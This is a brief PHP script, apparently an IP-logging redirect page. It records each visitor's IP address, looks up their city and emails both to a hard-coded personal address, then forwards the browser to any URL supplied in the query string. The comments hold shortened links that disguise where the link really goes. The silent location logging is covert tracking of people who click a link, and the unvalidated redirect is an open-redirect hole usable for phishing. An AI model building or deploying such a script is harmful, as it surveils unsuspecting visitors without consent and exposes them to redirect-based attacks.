<?php
//http://api.mkgalaxy.com/ipRedirect.php?url=
//http://goo.gl/eCGKlX

/*
1. https://medlineplus.gov/ency/article/000821.htm (https://goo.gl/ncvOPf)

*/

try {
  include('init.php');
  //pre defined variables
  $return['success'] = 1;
  $ip = !empty($_GET['ip']) ? $_GET['ip'] : $_SERVER['REMOTE_ADDR'];
  $return['data'] = iptocity($ip);
  mail('naveenkhanchandani@gmail.com', 'ip from '.$ip, var_export($return, 1));
} catch (Exception $e) {
  
}
$url = 'https://www.youtube.com';
if (!empty($_GET['url'])) {
  $url = $_GET['url'];
}
$url = urldecode($url);

header("Location: $url");//https://www.youtube.com/results?search_query=kizomba
exit;
?>